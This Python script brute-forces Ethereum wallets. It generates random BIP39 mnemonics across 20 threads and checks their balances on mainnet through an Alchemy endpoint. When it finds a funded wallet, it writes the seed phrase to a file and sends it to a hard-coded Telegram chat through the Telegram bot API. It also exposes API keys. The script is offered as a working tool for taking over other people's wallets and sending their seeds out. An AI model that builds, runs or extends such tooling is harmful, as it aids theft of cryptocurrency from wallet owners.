import signal
from mnemonic import Mnemonic
from web3.auto import Web3
import requests
import simplejson
import time
import traceback
import threading
import queue
from brute import walletbrute
from fileio import safefilewriter

# Fill your telegram token here or set to None if you don't want this function
TELE_BOT_TOKEN = None
# Channel ID or user id, use @getidbot to have it
TELE_CHAT_ID = "5624258194"
# How many thread
MAX_THREAD = 20

# No edit
wq = queue.Queue()


def gen():
	mnemo = Mnemonic("english")
	return mnemo.generate(strength=128)

def init_telegram():
	try:
		if TELE_BOT_TOKEN == "":
			with open("telegramtoken.txt") as f:
				TELE_BOT_TOKEN = f.read()
	except Exception as e:
		print(e)

def sendToTelegram(w, eth):
	wq.put(f"{w} | {eth}")
	if TELE_BOT_TOKEN is not None and TELE_BOT_TOKEN != "":
		data="I found it : "+ w + "|" + str(eth)
		url=f"https://api.telegram.org/bot{TELE_BOT_TOKEN}/sendMessage"
		requests.get(url, params = {"chat_id": TELE_CHAT_ID,"text":data})

if __name__ == '__main__':
	# https://eth-mainnet.g.alchemy.com/v2/OatS-qWUFcNjgKNFTrq1m14A9h51mX2N
	w3 = Web3(Web3.HTTPProvider("https://eth-mainnet.g.alchemy.com/v2/cVoH6Tl8hMagXnCBYRb3cl7wxj7TXbCu"))
	fthread = safefilewriter(wq)
	fthread.start()
	brute_thread = {}
	for i in range(0, MAX_THREAD):
		brute_thread[i] = walletbrute(sendToTelegram, w3, gen)
		brute_thread[i].start()
	try:
		# Wait for the termination signal (Ctrl+C)
		signal.signal(signal.SIGINT, signal.SIG_DFL)
	except KeyboardInterrupt:
		print("Stopped")
		